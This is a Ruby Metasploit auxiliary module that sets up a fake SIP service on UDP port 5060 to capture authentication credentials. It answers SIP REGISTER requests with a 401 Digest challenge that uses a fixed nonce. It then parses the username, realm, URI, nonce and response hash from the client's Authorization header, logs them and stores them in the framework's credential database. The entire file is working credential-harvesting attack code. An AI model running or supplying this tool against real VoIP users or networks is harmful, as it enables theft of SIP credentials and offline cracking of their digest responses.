##
# sip.rb 
##


require 'msf/core'
require 'rex/socket/udp'

class Metasploit3 < Msf::Auxiliary
	include Msf::Exploit::Remote::Udp
	include Msf::Auxiliary::Report

	
	def initialize
		super(
			'Name'        => 'Authentication Capture: SIP',
			'Version'     => '0.1',
			'Description'    => %q{
				This module provides a fake SIP service that
			is designed to capture authentication credentials.
			},
			'Author'      => ['spider'],
			'License'     => MSF_LICENSE,
			'Actions'     =>
				[
				 	[ 'Capture' ]
				],
			'PassiveActions' => 
				[
					'Capture'
				],
			'DefaultAction'  => 'Capture'
		)
		# super(update_info(info,'Stance' => Msf::Exploit::Stance::Passive))
		register_options(
			[
				OptPort.new('SRVPORT',    [ true, "The local port to listen on.", 5060 ])
			], self.class)
	end

	def setup
		super
		@state = {}
	end

	def run
		print_status("starting udp server..")
		serv = Rex::Socket::Udp.create('LocalPort' => '5060' )
		begin

			if (serv.kind_of? Rex::Socket::Udp)
				print_status("sip capture server started")
			else
				print_status("could not start sip capture server")
			end
			while 1 do
				data, host, port = serv.recvfrom
				if(host)
					lines = data.split("\n")
					if (lines[0] =~ /REGISTER/ )
						print_status("sip register request from #{host}:#{port}")
						auth = lines.select { |line| line =~ /Authorization/ }.join
						retransmit = lines.select{ |line| line =~ /Via|From|To|Call-ID|CSeq/ }.join("\n")
						if (auth.length >0)
							user = auth.slice(/username.*?".*?"/).slice(/".*"/).slice(/[^"].[^"]*/)
							realm = auth.slice(/realm.*?".*?"/).slice(/".*"/).slice(/[^"].[^"]*/)
							uri  = auth.slice(/uri.*?".*?"/).slice(/".*"/).slice(/[^"].[^"]*/)
							nonce = auth.slice(/nonce.*?".*?"/).slice(/".*"/).slice(/[^"].[^"]*/)
							response  = auth.slice(/response.*?".*?"/).slice(/".*"/).slice(/[^"].[^"]*/)
							print_status(	host+
								": user:'"+user+
								"' realm:'"+realm+
								"' uri:'"+uri+
								"' nonce:'"+nonce+
								"' response:"+response+"'")
							
							report_auth_info(
								:host      => host,
								:proto     => 'sip',
								:targ_host => realm,
								:user      => user,
								:extra     => "realm='#{realm}' uri='#{uri}' nonce='#{nonce} response='#{response}'"
							)
							reply = "SIP/2.0 503 Service Unavailable\n"
							reply += retransmit
						else
							reply = "SIP/2.0 401 Unauthorized\n"
							#reply = "HTTP 1.1 401 Unauthorized\n"
							reply += retransmit
							realm = lines[0].split(":")[1].split[0]
							reply += "WWW-Authenticate: Digest realm=\"#{realm}\", nonce=\"123456789\"\n"
							#reply += "WWW-Authenticate: Basic realm=\"sipgate.de\"\n"
							reply += "Content-Length: 0\n\n"
						end
						ip4 = host.split(':').last if host.include?(':')
						ip4 ||= host
						serv.sendto(reply, ip4 ,port.to_s())
					else
						print_status(data)
					end
				end
			end
			print_status("server shutdown")
		ensure
			serv.close
		end		
	end
	
	def exploit
		run
	end	
end
